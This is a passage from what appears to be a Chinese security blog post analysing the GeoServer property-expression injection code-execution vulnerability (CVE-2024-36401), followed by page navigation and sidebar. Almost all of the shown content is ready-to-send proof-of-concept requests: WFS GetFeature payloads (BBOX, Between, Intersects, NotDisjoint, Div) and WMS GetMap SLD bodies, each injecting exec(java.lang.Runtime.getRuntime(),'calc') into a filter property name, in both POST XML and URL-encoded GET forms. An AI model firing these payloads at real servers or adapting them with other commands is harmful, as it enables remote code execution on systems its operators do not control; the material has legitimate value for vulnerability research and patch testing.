<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">/geoserver/wms?version=<span class="number">1.3</span><span class="number">.0</span>&amp;bbox=<span class="number">24</span>,-<span class="number">130</span>,<span class="number">50</span>,-<span class="number">66</span>&amp;Format=image/png&amp;request=GetMap&amp;width=<span class="number">550</span>&amp;height=<span class="number">250</span>&amp;crs=EPSG:<span class="number">4326</span>&amp;SLD_BODY=%3CStyledLayerDescriptor+version%<span class="number">3D</span>%<span class="number">221.1</span><span class="number">.0</span>%<span class="number">22</span>%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%<span class="number">28</span>%<span class="number">29</span>%2C%22calc%<span class="number">22</span>%<span class="number">29</span>%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%<span class="number">3D</span>%22fill%<span class="number">22</span>%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%<span class="number">2F</span>%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E </span><br></pre></td></tr></tbody></table></figure>
<img src="/img/24-7-8/19.png">
跟上面的一样是从evalute走入的
## 其他Poc
### BBOX-1.0
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">&lt;wfs:GetFeature service="WFS" version="1.0.0"</span><br><span class="line">  xmlns:topp="http://www.openplans.org/topp"</span><br><span class="line">  xmlns:wfs="http://www.opengis.net/wfs"</span><br><span class="line">  xmlns:ogc="http://www.opengis.net/ogc"</span><br><span class="line">  xmlns:gml="http://www.opengis.net/gml"</span><br><span class="line">  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;</span><br><span class="line">  &lt;wfs:Query typeName="topp:states"&gt;</span><br><span class="line">    &lt;ogc:Filter&gt;</span><br><span class="line">      &lt;ogc:BBOX&gt;</span><br><span class="line">        &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;</span><br><span class="line">        &lt;gml:Box srsName="http://www.opengis.net/gml/srs/epsg.xml#4326"&gt;</span><br><span class="line">           &lt;gml:coordinates&gt;-75.102613,40.212597 -72.361859,41.512517&lt;/gml:coordinates&gt;</span><br><span class="line">        &lt;/gml:Box&gt;</span><br><span class="line">      &lt;/ogc:BBOX&gt;</span><br><span class="line">   &lt;/ogc:Filter&gt;</span><br><span class="line">  &lt;/wfs:Query&gt;</span><br><span class="line">&lt;/wfs:GetFeature&gt;</span><br></pre></td></tr></tbody></table></figure>
### BBOX-1.1
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">&lt;wfs:GetFeature service="WFS" version="1.1.0"</span><br><span class="line">  xmlns:topp="http://www.openplans.org/topp"</span><br><span class="line">  xmlns:wfs="http://www.opengis.net/wfs"</span><br><span class="line">  xmlns:ogc="http://www.opengis.net/ogc"</span><br><span class="line">  xmlns:gml="http://www.opengis.net/gml"</span><br><span class="line">  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;</span><br><span class="line">  &lt;wfs:Query typeName="topp:states"&gt;</span><br><span class="line">    &lt;ogc:Filter&gt;</span><br><span class="line">      &lt;ogc:BBOX&gt;</span><br><span class="line">        &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;</span><br><span class="line">        &lt;gml:Envelope srsName="http://www.opengis.net/gml/srs/epsg.xml#4326"&gt;</span><br><span class="line">           &lt;gml:lowerCorner&gt;-75.102613 40.212597&lt;/gml:lowerCorner&gt;</span><br><span class="line">           &lt;gml:upperCorner&gt;-72.361859 41.512517&lt;/gml:upperCorner&gt;</span><br><span class="line">        &lt;/gml:Envelope&gt;</span><br><span class="line">      &lt;/ogc:BBOX&gt;</span><br><span class="line">   &lt;/ogc:Filter&gt;</span><br><span class="line">  &lt;/wfs:Query&gt;</span><br><span class="line">&lt;/wfs:GetFeature&gt;</span><br></pre></td></tr></tbody></table></figure>
### Between-1.0/1.1
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;wfs:GetFeature service="WFS" version="1.0.0"</span><br><span class="line">  xmlns:topp="http://www.openplans.org/topp"</span><br><span class="line">  xmlns:wfs="http://www.opengis.net/wfs"</span><br><span class="line">  xmlns:ogc="http://www.opengis.net/ogc"</span><br><span class="line">  xmlns:gml="http://www.opengis.net/gml"</span><br><span class="line">  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;</span><br><span class="line">  &lt;wfs:Query typeName="topp:states"&gt;</span><br><span class="line">&lt;ogc:Filter&gt;</span><br><span class="line">&lt;ogc:PropertyIsBetween&gt;</span><br><span class="line">&lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;</span><br><span class="line">&lt;ogc:LowerBoundary&gt;&lt;ogc:Literal&gt;100000&lt;/ogc:Literal&gt;&lt;/ogc:LowerBoundary&gt;</span><br><span class="line">&lt;ogc:UpperBoundary&gt;&lt;ogc:Literal&gt;150000&lt;/ogc:Literal&gt;&lt;/ogc:UpperBoundary&gt;</span><br><span class="line">&lt;/ogc:PropertyIsBetween&gt;</span><br><span class="line">&lt;/ogc:Filter&gt;</span><br><span class="line">  &lt;/wfs:Query&gt;</span><br><span class="line">&lt;/wfs:GetFeature&gt; </span><br><span class="line"></span><br><span class="line">GET:</span><br><span class="line">/geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;propertyName=STATE_NAME,LAND_KM,the_geom&amp;outputFormat=GML2&amp;FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%3E%3CPropertyIsBetween%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLowerBoundary%3E%3CLiteral%3E100000%3C%2FLiteral%3E%3C%2FLowerBoundary%3E%3CUpperBoundary%3E%3CLiteral%3E150000%3C%2FLiteral%3E%3C%2FUpperBoundary%3E%3C%2FPropertyIsBetween%3E%3C%2FFilter%3E</span><br></pre></td></tr></tbody></table></figure>
### Intersects-1.0/1.1
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">&lt;wfs:GetFeature service="WFS" version="1.0.0"</span><br><span class="line">  xmlns:topp="http://www.openplans.org/topp"</span><br><span class="line">  xmlns:wfs="http://www.opengis.net/wfs"</span><br><span class="line">  xmlns="http://www.opengis.net/ogc"</span><br><span class="line">  xmlns:gml="http://www.opengis.net/gml"</span><br><span class="line">  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;</span><br><span class="line">  &lt;wfs:Query typeName="topp:states"&gt;</span><br><span class="line">    &lt;Filter&gt;</span><br><span class="line">      &lt;Intersects&gt;</span><br><span class="line">        &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/PropertyName&gt;</span><br><span class="line">        &lt;/Intersects&gt;</span><br><span class="line">      &lt;/Filter&gt;</span><br><span class="line">  &lt;/wfs:Query&gt;</span><br><span class="line">&lt;/wfs:GetFeature&gt;</span><br><span class="line"></span><br><span class="line">GET:</span><br><span class="line">/geoserver/wfs?request=GetFeature&amp;version=1.0.0&amp;typeName=topp:states&amp;FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%3E%3CIntersects%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3Cgml%3APoint+srsName%3D%22EPSG%3A4326%22%3E%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%3C%2Fgml%3APoint%3E%3C%2FIntersects%3E%3C%2FFilter%3E</span><br></pre></td></tr></tbody></table></figure>
### NotDisjoint
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">&lt;wfs:GetFeature service="WFS" version="2.0.0"</span><br><span class="line">    xmlns:wfs="http://www.opengis.net/wfs/2.0" xmlns:fes="http://www.opengis.net/fes/2.0"</span><br><span class="line">    xmlns:gml="http://www.opengis.net/gml/3.2" xmlns:sf="http://www.openplans.org/spearfish"</span><br><span class="line">    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">    xsi:schemaLocation="http://www.opengis.net/wfs/2.0 http://schemas.opengis.net/wfs/2.0/wfs.xsd</span><br><span class="line">        http://www.opengis.net/gml/3.2 http://schemas.opengis.net/gml/3.2.1/gml.xsd"&gt;</span><br><span class="line">    &lt;wfs:Query typeNames="sf:bugsites"&gt;</span><br><span class="line">        &lt;fes:Filter&gt;</span><br><span class="line">            &lt;fes:Not&gt;</span><br><span class="line">                &lt;fes:Disjoint&gt;</span><br><span class="line">                    &lt;fes:ValueReference&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/fes:ValueReference&gt;</span><br><span class="line">                &lt;/fes:Disjoint&gt;</span><br><span class="line">            &lt;/fes:Not&gt;</span><br><span class="line">        &lt;/fes:Filter&gt;</span><br><span class="line">    &lt;/wfs:Query&gt;</span><br><span class="line">&lt;/wfs:GetFeature&gt;</span><br><span class="line"></span><br><span class="line">GET:</span><br><span class="line">/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetFeature&amp;typenames=sf:bugsites&amp;filter=%3Cfes%3AFilter+xmlns%3Afes%3D%22http%3A%2F%2Fwww.opengis.net%2Ffes%2F2.0%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2F3.2%22%3E%3Cfes%3ANot%3E%3Cfes%3ADisjoint%3E%3Cfes%3AValueReference%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2Ffes%3AValueReference%3E%3Cgml%3APolygon+gml%3Aid%3D%27polygon.1%27+srsName%3D%27http%3A%2F%2Fwww.opengis.net%2Fdef%2Fcrs%2FEPSG%2F0%2F26713%27%3E%3Cgml%3Aexterior%3E%3Cgml%3ALinearRing%3E%3Cgml%3AposList%3E590431+4915204+590430+4915205+590429+4915204+590430+4915203+590431+4915204%3C%2Fgml%3AposList%3E%3C%2Fgml%3ALinearRing%3E%3C%2Fgml%3Aexterior%3E%3C%2Fgml%3APolygon%3E%3C%2Ffes%3ADisjoint%3E%3C%2Ffes%3ANot%3E%3C%2Ffes%3AFilter%3E</span><br></pre></td></tr></tbody></table></figure>
### Math
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">&lt;wfs:GetFeature service="WFS" version="1.0.0"</span><br><span class="line">  xmlns:topp="http://www.openplans.org/topp"</span><br><span class="line">  xmlns:wfs="http://www.opengis.net/wfs"</span><br><span class="line">  xmlns:ogc="http://www.opengis.net/ogc"</span><br><span class="line">  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;</span><br><span class="line">  &lt;wfs:Query typeName="topp:states"&gt;</span><br><span class="line">    &lt;ogc:Filter&gt;</span><br><span class="line">      &lt;ogc:PropertyIsGreaterThan&gt;</span><br><span class="line">        &lt;ogc:Div&gt;</span><br><span class="line">            &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;</span><br><span class="line">            &lt;ogc:PropertyName&gt;xxx&lt;/ogc:PropertyName&gt;</span><br><span class="line">        &lt;/ogc:Div&gt;</span><br><span class="line">         &lt;ogc:Literal&gt;0.25&lt;/ogc:Literal&gt;</span><br><span class="line">    &lt;/ogc:PropertyIsGreaterThan&gt;</span><br><span class="line">    &lt;/ogc:Filter&gt;</span><br><span class="line">    &lt;/wfs:Query&gt;</span><br><span class="line">&lt;/wfs:GetFeature&gt;</span><br><span class="line"></span><br><span class="line">GET：</span><br><span class="line">/geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;formatName=GML2&amp;FILTER=%3Cogc:Filter%20xmlns:ogc=%22http://www.opengis.net/ogc%22%3E%3Cogc:PropertyIsGreaterThan%3E%3Cogc:Div%3E%3Cogc:PropertyName%3EMANUAL%3C/ogc:PropertyName%3E%3Cogc:PropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C/ogc:PropertyName%3E%3C/ogc:Div%3E%3Cogc:Literal%3E0.25%3C/ogc:Literal%3E%3C/ogc:PropertyIsGreaterThan%3E%3C/ogc:Filter%3E</span><br></pre></td></tr></tbody></table></figure>
## WMS getMap

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">GET /geoserver/wms?version=1.3.0&amp;bbox=24,-130,50,-66&amp;Format=image/png&amp;request=GetMap&amp;width=550&amp;height=250&amp;crs=EPSG:4326&amp;SLD_BODY=%3CStyledLayerDescriptor+version%3D%221.1.0%22%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%3D%22fill%22%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%2F%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8085</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;ogc:GetMap xmlns:ogc="http://www.opengis.net/ows" </span><br><span class="line">            xmlns:gml="http://www.opengis.net/gml" </span><br><span class="line">            version="1.2.0"</span><br><span class="line">            service="WMS"&gt;</span><br><span class="line"></span><br><span class="line">  &lt;StyledLayerDescriptor version="1.0.0" </span><br><span class="line">                         xsi:schemaLocation="http://www.opengis.net/sld StyledLayerDescriptor.xsd"</span><br><span class="line">                         xmlns="http://www.opengis.net/sld" </span><br><span class="line">                         xmlns:ogc="http://www.opengis.net/ogc" </span><br><span class="line">                         xmlns:xlink="http://www.w3.org/1999/xlink"</span><br><span class="line">                         xmlns:dave="http://blasby.com" </span><br><span class="line">                         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;</span><br><span class="line">    &lt;UserLayer&gt;</span><br><span class="line">      &lt;Name&gt;Inline&lt;/Name&gt;</span><br><span class="line"></span><br><span class="line">      &lt;InlineFeature&gt;</span><br><span class="line">        &lt;FeatureCollection&gt;</span><br><span class="line">          &lt;featureMember&gt;</span><br><span class="line">            &lt;BodyPart&gt;</span><br><span class="line">              &lt;Type&gt;Mouth&lt;/Type&gt;</span><br><span class="line">              &lt;polygonProperty&gt;</span><br><span class="line">                &lt;gml:Polygon&gt;</span><br><span class="line">                  &lt;gml:outerBoundaryIs&gt;</span><br><span class="line">                    &lt;gml:LinearRing&gt;</span><br><span class="line">                      &lt;gml:coordinates&gt;</span><br><span class="line">                        397,226 396,209 396,196 390,185 384,175 368,163 353,155 331,150 308,149 283,148 261,153 231,163</span><br><span class="line">                        209,175 195,189 186,209 182,221 187,226 193,214 195,205 200,197 203,192 215,185 226,177 241,171</span><br><span class="line">                        256,167 266,163 281,161 297,161 321,160 341,160 359,168 371,175 382,185 388,197 390,215 390,225</span><br><span class="line">                        394,226 397,226</span><br><span class="line">                      &lt;/gml:coordinates&gt;</span><br><span class="line">                    &lt;/gml:LinearRing&gt;</span><br><span class="line">                  &lt;/gml:outerBoundaryIs&gt;</span><br><span class="line">                &lt;/gml:Polygon&gt;</span><br><span class="line">              &lt;/polygonProperty&gt;</span><br><span class="line">            &lt;/BodyPart&gt;</span><br><span class="line">          &lt;/featureMember&gt;</span><br><span class="line">        &lt;/FeatureCollection&gt;</span><br><span class="line">      &lt;/InlineFeature&gt;</span><br><span class="line"></span><br><span class="line">      &lt;UserStyle&gt;</span><br><span class="line">        &lt;FeatureTypeStyle&gt;</span><br><span class="line">          &lt;Rule&gt;</span><br><span class="line">            &lt;Filter&gt;</span><br><span class="line">              &lt;Or&gt;</span><br><span class="line">                &lt;PropertyIsEqualTo&gt;</span><br><span class="line">                  &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/PropertyName&gt;</span><br><span class="line">                  &lt;Literal&gt;Eye&lt;/Literal&gt;</span><br><span class="line">                &lt;/PropertyIsEqualTo&gt;</span><br><span class="line">              &lt;/Or&gt;</span><br><span class="line">            &lt;/Filter&gt;</span><br><span class="line">            &lt;PolygonSymbolizer&gt;</span><br><span class="line">              &lt;Fill&gt;</span><br><span class="line">                &lt;CssParameter name="fill"&gt;</span><br><span class="line">                  &lt;ogc:Literal&gt;#DD06E0&lt;/ogc:Literal&gt;</span><br><span class="line">                &lt;/CssParameter&gt;</span><br><span class="line">                &lt;CssParameter name="fill-opacity"&gt;</span><br><span class="line">                  &lt;ogc:Literal&gt;1.0&lt;/ogc:Literal&gt;</span><br><span class="line">                &lt;/CssParameter&gt;</span><br><span class="line">              &lt;/Fill&gt;</span><br><span class="line">              &lt;Stroke&gt;</span><br><span class="line">                &lt;CssParameter name="stroke"&gt;</span><br><span class="line">                  &lt;ogc:Literal&gt;#FF00FF&lt;/ogc:Literal&gt;</span><br><span class="line">                &lt;/CssParameter&gt;</span><br><span class="line">              &lt;/Stroke&gt;</span><br><span class="line">            &lt;/PolygonSymbolizer&gt;</span><br><span class="line">          &lt;/Rule&gt;</span><br><span class="line">        &lt;/FeatureTypeStyle&gt;</span><br><span class="line">      &lt;/UserStyle&gt;</span><br><span class="line">    &lt;/UserLayer&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/StyledLayerDescriptor&gt;</span><br><span class="line"></span><br><span class="line">  &lt;BoundingBox&gt;</span><br><span class="line">    &lt;gml:coord&gt;</span><br><span class="line">      &lt;gml:X&gt;0&lt;/gml:X&gt;</span><br><span class="line">      &lt;gml:Y&gt;0&lt;/gml:Y&gt;</span><br><span class="line">    &lt;/gml:coord&gt;</span><br><span class="line">    &lt;gml:coord&gt;</span><br><span class="line">      &lt;gml:X&gt;500&lt;/gml:X&gt;</span><br><span class="line">      &lt;gml:Y&gt;500&lt;/gml:Y&gt;</span><br><span class="line">    &lt;/gml:coord&gt;</span><br><span class="line">  &lt;/BoundingBox&gt;</span><br><span class="line"></span><br><span class="line">  &lt;Output&gt;</span><br><span class="line">    &lt;Format&gt;image/jpeg&lt;/Format&gt;</span><br><span class="line">    &lt;Transparent&gt;false&lt;/Transparent&gt;</span><br><span class="line">    &lt;Size&gt;</span><br><span class="line">      &lt;Width&gt;501&lt;/Width&gt;</span><br><span class="line">      &lt;Height&gt;501&lt;/Height&gt;</span><br><span class="line">    &lt;/Size&gt;</span><br><span class="line">  &lt;/Output&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/ogc:GetMap&gt;</span><br></pre></td></tr></tbody></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></li>
<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/">https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/geoserver/" rel="tag">geoserver</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="tag">表达式注入</a></li></ul>


    </footer>
  </div>
  
    
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          
          
            <img data-src="https://cdn.pixabay.com/photo/2024/01/22/10/49/ai-generated-8524877_1280.jpg" data-sizes="auto" alt="springcloud dataflow任意文件写入（CVE-2024-22263）" class="lazyload">
          
        
        <a href="/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/"></a>
        <div class="article-nav-caption">前一篇</div>
        <h3 class="article-nav-title">
          
            springcloud dataflow任意文件写入（CVE-2024-22263）
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        
        
          <img data-src="https://pic.3gbizhi.com/uploads/20240409/d5d041d0a34a8970fff3c21578c31a9b.jpg" data-sizes="auto" alt="Apache Commons JXPath" class="lazyload">
        
      
      <a href="/2024/07/08/Apache-Commons-JXPath/"></a>
      <div class="article-nav-caption">后一篇</div>
      <h3 class="article-nav-title">
        
          Apache Commons JXPath
        
      </h3>
    </div>
    
  </nav>


  
</article>




  <div id="comments" class="gtcomment"></div>



</section>
          
            <aside id="sidebar">
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">文章目录</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">GeoServer表达式注入代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetPropertyValue"><span class="toc-number">1.2.1.</span> <span class="toc-text">GetPropertyValue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetFeature"><span class="toc-number">1.2.2.</span> <span class="toc-text">GetFeature</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
  <div class="sidebar-author-name">Yyjccc</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>文章</div>
    <div class="sidebar-state-number">45</div>
  </div>
  <div class="sidebar-state-category">
    <div>分类</div>
    <div class="sidebar-state-number">6</div>
  </div>
  <div class="sidebar-state-tag">
    <div>标签</div>
    <div class="sidebar-state-number">69</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">首页</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">归档</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">关于</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">友链</div>
    </div>
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  
</aside>

          
        </div>
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2023-2024
      <span class="footer-info-sep"></span>
      Yyjccc
    </div>
    
      <div>
        基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        154.6k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        10:30
      </div>
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        <div class="sidebar-top">
          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
          <div class="arrow-up"></div>
        </div>
        <div id="mask"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">文章目录</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">GeoServer表达式注入代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetPropertyValue"><span class="toc-number">1.2.1.</span> <span class="toc-text">GetPropertyValue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetFeature"><span class="toc-number">1.2.2.</span> <span class="toc-text">GetFeature</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
  <div class="sidebar-author-name">Yyjccc</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>文章</div>
    <div class="sidebar-state-number">45</div>
  </div>
  <div class="sidebar-state-category">
    <div>分类</div>
    <div class="sidebar-state-number">6</div>
  </div>
  <div class="sidebar-state-tag">
    <div>标签</div>
    <div class="sidebar-state-number">69</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
